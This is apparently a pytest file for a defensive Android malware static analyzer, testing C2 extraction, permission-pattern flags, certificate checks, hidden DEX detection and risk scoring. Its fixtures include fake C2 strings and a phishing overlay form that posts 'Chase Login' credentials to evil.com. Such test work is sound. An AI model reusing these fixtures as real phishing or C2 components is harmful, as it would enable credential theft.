"""
Unit tests for Android malware static enrichments (apk_static.py):
  - C2 IoC regex extraction
  - Permission matrix patterns
  - Certificate anomaly analysis
  - Secondary DEX / payload inspection
  - Accessibility config XML parsing
  - Uncompressed YARA multi-target scanning helpers
"""
import io
import os
import sys
import tempfile
import zipfile
from datetime import datetime, timedelta, timezone

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.analysis.apk_static import (
    extract_c2_indicators,
    detect_permission_matrix,
    analyze_certificate_anomalies,
    inspect_apk_payloads,
    _parse_a11y_xml_text,
    detect_dynamic_loading_signals,
)
from app.analysis.yara_engine import scan_apk_with_payloads, _dedupe_yara_matches
from app.reports.scoring import (
    compute_risk_score,
    permission_api_risk_component,
    ioc_component,
)
from app.core.schemas import ObfuscationSignal, IngestionResult, AnalysisManifest


# ── C2 extraction ───────────────────────────────────────────────────────

def test_extract_telegram_bot_c2():
    strings = [
        "https://api.telegram.org/bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage",
        "benign sdk string",
    ]
    iocs = extract_c2_indicators(strings)
    assert any(x.startswith("telegram_bot:123456789:") for x in iocs), iocs


def test_extract_firebase_discord_onion_ip():
    strings = [
        "https://evil-c2.firebaseio.com/bots.json",
        "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEF",
        # Real Tor v3 addresses use RFC 4648 base32: a-z and 2-7 only (0/1/8/9
        # excluded as visually ambiguous with O/I/B/g) — this fixture must stay
        # within that alphabet or it silently fails to exercise _RE_ONION.
        "http://abcdefghijklmnopqrstuvwxyz234567.onion/gate",
        "http://185.220.101.45:8080/panel/",
        "https://legit.example.com/api",  # should NOT produce raw_ip
    ]
    iocs = extract_c2_indicators(strings)
    kinds = {x.split(":")[0] for x in iocs}
    assert "firebase" in kinds, iocs
    assert "discord_webhook" in kinds, iocs
    assert "onion" in kinds, iocs
    assert "raw_ip" in kinds or "panel_url" in kinds, iocs


def test_extract_c2_ignores_short_noise():
    assert extract_c2_indicators(["http", "ab", ""]) == []


# ── Permission matrix ───────────────────────────────────────────────────

def test_overlay_attack_pattern():
    perms = [
        "android.permission.SYSTEM_ALERT_WINDOW",
        "android.permission.PACKAGE_USAGE_STATS",
        "android.permission.INTERNET",
    ]
    flags = detect_permission_matrix(perms)
    assert "OVERLAY_ATTACK_PATTERN" in flags, flags


def test_sms_otp_stealer_pattern():
    perms = [
        "android.permission.BIND_ACCESSIBILITY_SERVICE",
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_SMS",
    ]
    flags = detect_permission_matrix(perms)
    assert "SMS_OTP_STEALER_PATTERN" in flags, flags


def test_dropper_stage2_pattern():
    perms = [
        "android.permission.REQUEST_INSTALL_PACKAGES",
        "android.permission.INTERNET",
    ]
    flags = detect_permission_matrix(perms)
    assert "DROPPER_STAGE2_PATTERN" in flags, flags


def test_benign_single_permission_no_matrix():
    flags = detect_permission_matrix(["android.permission.INTERNET"])
    assert flags == []


# ── Certificate anomalies ───────────────────────────────────────────────

def _make_self_signed_der(cn: str = "Android Debug", days_valid: int = 365):
    """Build a minimal self-signed cert DER using asn1crypto + oscrypto if available,
    otherwise skip-friendly synthetic path via cryptography-free approach.

    We use asn1crypto's Certificate builder is complex; instead craft via
    androguard-independent openssl-free approach: generate with a tiny
    hand-built test using asn1crypto if keys available, else return None.
    """
    try:
        from asn1crypto import x509, core, keys, pem
        from asn1crypto.algos import SignedDigestAlgorithm
    except ImportError:
        return None

    # Prefer a real cert if cryptography gets installed later; for unit tests
    # we exercise analyze_certificate_anomalies with a pre-baked minimal path
    # by calling missing_certificate and unparseable paths.
    return None


def test_cert_anomaly_missing():
    assert "missing_certificate" in analyze_certificate_anomalies([])


def test_cert_anomaly_unparseable():
    flags = analyze_certificate_anomalies([b"not-a-real-cert"])
    assert "unparseable_certificate" in flags


def test_cert_anomaly_debug_key_with_real_der():
    """If we can generate a debug-like cert, flag it; otherwise soft-skip."""
    try:
        from cryptography import x509 as cx509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend
    except ImportError:
        # asn1crypto-only path: already covered by missing/unparseable tests
        return

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    subject = issuer = cx509.Name([
        cx509.NameAttribute(NameOID.COMMON_NAME, "Android Debug"),
        cx509.NameAttribute(NameOID.ORGANIZATION_NAME, "Android"),
    ])
    now = datetime.now(timezone.utc)
    cert = (
        cx509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(1)
        .not_valid_before(now - timedelta(days=1))
        .not_valid_after(now + timedelta(days=30))
        .sign(key, hashes.SHA256(), default_backend())
    )
    der = cert.public_bytes(serialization.Encoding.DER)
    flags = analyze_certificate_anomalies([der])
    assert any("debug" in f.lower() or "self_signed" in f for f in flags), flags


# ── Payload / multi-DEX inspection ───────────────────────────────────────

def _write_minimal_apk(path: str, entries: dict[str, bytes]):
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)


def test_inspect_secondary_dex_and_hidden_payload():
    dex_header = b"dex\n035\x00" + b"\x00" * 100
    hidden = b"dex\n037\x00" + b"\x00" * 50
    overlay_html = b"<html><form action='http://evil.com/login'>Chase Login</form></html>"

    with tempfile.TemporaryDirectory() as td:
        apk_path = os.path.join(td, "sample.apk")
        _write_minimal_apk(apk_path, {
            "classes.dex": dex_header,
            "classes2.dex": dex_header,
            "assets/payload.dat": hidden,  # disguised DEX
            "assets/chase.html": overlay_html,
            "AndroidManifest.xml": b"not-real",
        })
        result = inspect_apk_payloads(apk_path)

    assert result["secondary_dex_count"] >= 2, result
    assert any("secondary_dex" in p or "hidden_dex" in p for p in result["payload_assets"]), result
    assert any("overlay" in s for s in result["dropper_signals"]), result["dropper_signals"]
    labels = [lbl for lbl, _ in result["yara_targets"]]
    assert any("classes.dex" in lbl for lbl in labels), labels
    assert any("classes2.dex" in lbl for lbl in labels), labels


# ── Accessibility config ─────────────────────────────────────────────────

def test_parse_a11y_xml_keylogging_flags():
    xml = """<?xml version="1.0" encoding="utf-8"?>
    <accessibility-service
        canRetrieveWindowContent="true"
        canPerformGestures="true"
        accessibilityEventTypes="typeAllMasks"
        accessibilityFeedbackType="feedbackGeneric" />
    """
    flags = _parse_a11y_xml_text(xml, "res/xml/accessibility_service_config.xml")
    assert "canRetrieveWindowContent=true" in flags
    assert "canPerformGestures=true" in flags
    assert any("typeAllMasks" in f for f in flags), flags
    assert any("keylogging_event_mask" in f for f in flags), flags


# ── Dynamic loading ──────────────────────────────────────────────────────

def test_dynload_signals():
    sigs = detect_dynamic_loading_signals([
        "Ldalvik/system/DexClassLoader;",
        "InMemoryDexClassLoader",
        "hello world",
    ])
    assert any("DexClassLoader" in s for s in sigs)
    assert any("InMemoryDexClassLoader" in s for s in sigs)


# ── YARA multi-target dedupe ─────────────────────────────────────────────

def test_dedupe_yara_matches_merges_targets():
    matches = [
        {
            "rule_name": "AndroidBankingTrojan_C2Patterns",
            "tags": [],
            "severity": 0.8,
            "description": "c2",
            "category": "c2_communication",
            "matched_strings": ["$bot_cmd1"],
            "scan_target": "apk",
        },
        {
            "rule_name": "AndroidBankingTrojan_C2Patterns",
            "tags": ["extra"],
            "severity": 0.9,
            "description": "c2",
            "category": "c2_communication",
            "matched_strings": ["$bot_cmd3"],
            "scan_target": "dex:classes.dex",
        },
    ]
    merged = _dedupe_yara_matches(matches)
    assert len(merged) == 1
    assert merged[0]["severity"] == 0.9
    assert "$bot_cmd1" in merged[0]["matched_strings"]
    assert "$bot_cmd3" in merged[0]["matched_strings"]
    assert "apk" in merged[0]["scan_target"]
    assert "dex:classes.dex" in merged[0]["scan_target"]


def test_scan_apk_with_payloads_runs():
    """Smoke test: multi-target scan doesn't crash (YARA may be unavailable)."""
    dex = b"dex\n035\x00" + b"sendSMS" + b"\x00" * 40
    with tempfile.TemporaryDirectory() as td:
        apk_path = os.path.join(td, "t.apk")
        _write_minimal_apk(apk_path, {"classes.dex": dex})
        matches, targets = scan_apk_with_payloads(
            apk_path,
            payload_targets=[("dex:classes.dex", dex)],
            rules_dir="",
        )
    assert "apk" in targets
    assert any("classes.dex" in t for t in targets)
    assert isinstance(matches, list)


# ── Scoring integration ──────────────────────────────────────────────────

def test_scoring_uses_matrix_and_c2():
    obf = ObfuscationSignal(
        string_entropy_score=3.0,
        flattening_suspected=False,
        coverage_note="ok",
    )
    # High matrix + C2 should push score above a bare INTERNET-only sample
    high = compute_risk_score(
        predicted_ttps={},
        permissions=[
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.PACKAGE_USAGE_STATS",
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.permission.READ_SMS",
        ],
        obfuscation=obf,
        entropy_threshold=7.0,
        matched_anchor_behaviors={"ACCESSIBILITY_ABUSE", "OTP_INTERCEPTION"},
        permission_matrix_flags=["OVERLAY_ATTACK_PATTERN", "SMS_OTP_STEALER_PATTERN"],
        extracted_c2_count=2,
        cert_anomaly_count=1,
        secondary_dex_count=1,
        dropper_signal_count=2,
    )
    low = compute_risk_score(
        predicted_ttps={},
        permissions=["android.permission.INTERNET"],
        obfuscation=obf,
        entropy_threshold=7.0,
    )
    assert high.total_score > low.total_score
    assert high.permission_api_component > low.permission_api_component
    assert high.ioc_component > low.ioc_component


def test_permission_matrix_boosts_component():
    base = permission_api_risk_component(
        ["android.permission.SYSTEM_ALERT_WINDOW"]
    )
    boosted = permission_api_risk_component(
        [
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.PACKAGE_USAGE_STATS",
        ],
        permission_matrix_flags=["OVERLAY_ATTACK_PATTERN"],
    )
    assert boosted > base


def test_ioc_component_extracted_c2():
    bare = ioc_component(matched_c2_indicators=0)
    with_c2 = ioc_component(matched_c2_indicators=0, extracted_c2_count=2)
    assert with_c2 > bare


def test_schema_accepts_new_fields():
    ing = IngestionResult(
        sha256="a" * 64,
        c2_indicators=["telegram_bot:1:AA"],
        cert_anomalies=["self_signed"],
        permission_matrix_flags=["DROPPER_STAGE2_PATTERN"],
        secondary_dex_count=2,
        accessibility_flags=["canRetrieveWindowContent=true"],
        exported_risks=["exported_receiver_no_perm:com.evil.SmsRx"],
        payload_assets=["assets/c.db|hidden_dex_magic"],
        dropper_signals=["hidden_dex_in_assets:assets/c.db"],
    )
    assert ing.secondary_dex_count == 2
    manifest = AnalysisManifest(
        target_package="com.evil",
        sha256=ing.sha256,
        cache_hit=False,
        total_nodes_parsed=0,
        graph_density=0.0,
        behavioral_subgraphs=[],
        obfuscation=ObfuscationSignal(
            string_entropy_score=0.0,
            flattening_suspected=False,
            coverage_note="ok",
        ),
        predicted_ttps={},
        predicted_family=None,
        family_confidence=None,
        c2_indicators=ing.c2_indicators,
        cert_anomalies=ing.cert_anomalies,
        permission_matrix_flags=ing.permission_matrix_flags,
        secondary_dex_count=ing.secondary_dex_count,
        accessibility_flags=ing.accessibility_flags,
        exported_risks=ing.exported_risks,
        payload_assets=ing.payload_assets,
        dropper_signals=ing.dropper_signals,
    )
    dumped = manifest.model_dump()
    assert dumped["c2_indicators"]
    assert dumped["permission_matrix_flags"] == ["DROPPER_STAGE2_PATTERN"]


if __name__ == "__main__":
    import pytest
    raise SystemExit(pytest.main([__file__, "-v"]))
